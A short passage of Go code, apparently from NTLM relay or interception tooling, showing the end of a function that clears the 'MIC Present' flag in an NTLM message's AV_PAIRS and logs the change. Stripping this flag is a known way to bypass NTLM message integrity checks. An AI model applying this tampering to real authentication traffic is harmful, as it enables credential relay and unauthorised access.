				c.logger.Debug("Cleared MIC Present flag in AV_PAIRS")
			}
			break // We found and modified MsvAvFlags, we're done
		}

		offset += 4 + uint32(avLen)
	}

	return modified
}
